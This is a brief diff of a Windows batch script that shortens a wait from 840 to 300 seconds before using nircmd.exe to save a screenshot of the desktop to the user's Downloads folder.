@@ -9,7 +9,7 @@ set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"
 
 
 
-timeout /t 840 /nobreak
+timeout /t 300 /nobreak
 
 "%APPDATA%\Microsoft\nircmd.exe" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"
 
